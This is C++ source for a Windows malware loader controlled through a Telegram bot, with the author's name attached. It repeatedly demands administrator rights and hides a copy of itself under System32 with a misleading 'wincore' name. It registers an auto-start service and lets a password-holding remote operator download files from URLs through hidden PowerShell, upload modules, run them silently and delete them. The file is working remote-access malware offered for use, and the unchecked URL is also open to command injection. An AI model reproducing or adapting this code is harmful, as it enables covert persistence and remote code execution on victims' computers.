// CREATOR 
// GitHub https://github.com/cppandpython
// NAME: Vladislav 
// SURNAME: Khudash  
// AGE: 17

// DATE: 05.12.2025
// APP: LOADER_WINDOWS
// TYPE: LOADER
// VERSION: LATEST
// PLATFORM: ANY


//-
//--
//---
//----
//-----
//------
#define TOKEN "HERE IS THE TELEGRAM BOT TOKEN"
#define PASSWORD "HERE IS THE PASSWORD FOR THE SESSION WITH THE BOT"
//------
//-----
//----
//---
//--
//-




#include <tgbot/tgbot.h>
#include <string>
#include <sstream>
#include <filesystem>
#include <fstream>
#include <windows.h>
#include <shlobj.h>


#define PATH "C:\\Windows\\System32\\wincore"
#define PATH_FILE (PATH "\\wincore.exe")
#define PATH_MODULE (PATH "\\module")


namespace fs = std::filesystem;


void write_file(std::string path, std::string data) {
    std::ofstream file(path);
    file << data << std::endl;
    file.close();
}


bool get_next_token(std::istringstream& iss, std::string& token) {
    char c;

    token.clear();

    while (iss.get(c)) {
        if (!isspace(c)) {
            break;
        }
    }

    if (iss.eof()) {
        return false;
    }

    if (c == '"') { 
        while (iss.get(c)) {
            if (c == '"') {
                break;
            }

            token += c;
        }
    } 
    else { 
        token += c;

        while (iss.get(c)) {
            if (isspace(c)) {
                break;
            }

            token += c;
        }
    }

    return true;
}


bool parse_load(std::string text, std::string &url, std::string &name) {
    std::istringstream iss(text);
    std::string word;

    if ((!get_next_token(iss, word)) || (word != "load")) {
        return false;
    }

    if (!get_next_token(iss, url)) {
        return false;
    }

    if ((!get_next_token(iss, word)) || (word != "-n")) {
        return false;
    }

    if (!get_next_token(iss, name)) {
        return false;
    }

    return true;
}


int load_url(std::string url, std::string name) {
    return start_module("powershell -Command \"Invoke-WebRequest -Uri '" + url + "' -OutFile '" + name + "'\"");
}


int start_module(std::string path) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    LPSTR cmd = &path[0];  

    if (CreateProcess(
        NULL,           
        cmd,          
        NULL,           
        NULL,            
        FALSE,          
        CREATE_NO_WINDOW, 
        NULL,            
        NULL,         
        &si,            
        &pi             
    )) {
        CloseHandle(pi.hProcess); 
        CloseHandle(pi.hThread);   
        return 0;          
    } 
    else {
        return 1;        
    }
}


bool exist_service(const char *service_name) {
    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);

    if (!scm) {
        return false;
    }

    SC_HANDLE service = OpenServiceA(scm, service_name, SERVICE_QUERY_STATUS);

    if (service) {
        CloseServiceHandle(service);
        CloseServiceHandle(scm);
        return true; 
    }

    CloseServiceHandle(scm);

    return false; 
}


void init_service() {
    if (exist_service("wincore")) {
        return;
    }

    SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);

    SC_HANDLE service = CreateServiceA(
        scm,
        "wincore",                
        "Windows Loader",         
        SERVICE_QUERY_STATUS,   
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        PATH_FILE,               
        nullptr, 
        nullptr, 
        nullptr,
        nullptr, 
        nullptr
    );

    CloseServiceHandle(service);
    CloseServiceHandle(scm);
}


bool get_admin() {
    SHELLEXECUTEINFOA sei = { 0 };

    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.hwnd = NULL;
    sei.lpVerb = "runas";        
    sei.lpFile = PATH_FILE;          
    sei.lpParameters = NULL;
    sei.lpDirectory  = NULL;
    sei.nShow = SW_HIDE;         

    if (!ShellExecuteExA(&sei)) {
        DWORD err = GetLastError();
        return false;
    }

    if (sei.hProcess)
        CloseHandle(sei.hProcess);

    return true;
}


int init(char *current_file) {
    if (!IsUserAnAdmin()) {
        while (!get_admin());
        return -1;
    }

    if (!fs::exists(PATH)) {
        fs::create_directory(PATH);
        SetFileAttributesA(PATH, FILE_ATTRIBUTE_HIDDEN);
    }

    if (!fs::exists(PATH_MODULE)) {
        fs::create_directory(PATH_MODULE);
    }

    if (!fs::exists(PATH_FILE)) {
        fs::copy(current_file, PATH_FILE);
    }

    init_service();

    return 0;
}


void bot() {
    TgBot::Bot bot(TOKEN);

    bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
        int64_t chat_id = message->chat->id;
        auto document = message->document;
        std::string text = message->text;
        std::string userid = std::to_string(message->from->id);

        std::string user_session = std::string(PATH) + "\\" + userid;

        if (!fs::exists(user_session)) {
            if (text == PASSWORD) {
                write_file(user_session, "");
                SetFileAttributesA(user_session.c_str(), FILE_ATTRIBUTE_HIDDEN);
                bot.getApi().sendMessage(chat_id, "Entered session");
                return;
            }
            else {
                bot.getApi().sendMessage(chat_id, "Enter password to connect to this session");
                return;
            }
        }

        if (StringTools::startsWith(text, "help")) {
            bot.getApi().sendMessage(chat_id, R"(
Command                   Description
-------                   -----------                                                                                                           
help                      Help menu
load                      Download module Internet
run                       Run module
del                       Delete module
module                    List of installed modules
)");
        }
        else if (document) {
            std::string module_name = document->fileName;
            std::string file_path = std::string(PATH_MODULE) + "\\" + module_name;

            write_file(file_path, bot.getApi().downloadFile(bot.getApi().getFile(document->fileId)->filePath));

            bot.getApi().sendMessage(chat_id, "added module(" + module_name + ") [+]");
        }
        else if (StringTools::startsWith(text, "load")) { 
            if (text.length() > 5) {
                std::string url, name;

                if (parse_load(text, url, name)) {
                    if (load_url(url, std::string(PATH_MODULE) + "\\" + name) == 0) {
                        bot.getApi().sendMessage(chat_id, "added module(" + name + ") [+]");
                    }
                    else {
                        bot.getApi().sendMessage(chat_id, "module(" + name + ") not added [-]");
                    }
                }
                else {
                    bot.getApi().sendMessage(chat_id, "(url or name) incorrect");
                }
            }
            else {
                bot.getApi().sendMessage(chat_id, "load (url) -n (module name)  -  Download module Internet");
            }
        }
        else if (StringTools::startsWith(text, "run")) { 
            if (text.length() > 4) {
                std::string module_name = text.substr(4);
                std::string run_module_path = std::string(PATH_MODULE) + "\\" + module_name;

                if (fs::exists(run_module_path)) {
                    start_module(run_module_path);
                    bot.getApi().sendMessage(chat_id, "ran module(" + module_name + ") [*]");
                }
                else {
                    bot.getApi().sendMessage(chat_id, "module(" + module_name + ") not exist");
                }
            }
            else {
                bot.getApi().sendMessage(chat_id, "run (module name)  -  Run module");
            }
        }
        else if (StringTools::startsWith(text, "del")) { 
            if (text.length() > 4) {
                std::string module_name = text.substr(4);
                std::string del_module_path = std::string(PATH_MODULE) + "\\" + module_name;

                if (fs::exists(del_module_path)) {
                    fs::remove(del_module_path);

                    if (!fs::exists(del_module_path)) {
                        bot.getApi().sendMessage(chat_id, "deleted module(" + module_name + ") [+]");
                    }
                    else {
                        bot.getApi().sendMessage(chat_id, "module(" + module_name + ") not deleted [-]");
                    }
                }
                else {
                    bot.getApi().sendMessage(chat_id, "module(" + module_name + ") not exist");
                }
            }
            else {
                bot.getApi().sendMessage(chat_id, "del (module name)  -  Delete module");
            }
        }
        else if (StringTools::startsWith(text, "module")) {
            for (const auto &entry : fs::directory_iterator(PATH_MODULE)) {
                bot.getApi().sendMessage(chat_id, entry.path().filename().string());
            }
        }
        else {
            bot.getApi().sendMessage(chat_id, "command (" + text + ") not found");
        }
    });

    TgBot::TgLongPoll longPoll(bot);while (true) { longPoll.start(); }
}


int main(int argc, char *argv[]) {
    if (init(argv[0]) == 0) {
        while (true) {
            try {
                bot();
            }
            catch (std::exception&) {
                Sleep(5000);
            }
        }
    }
 
    return 0;
}
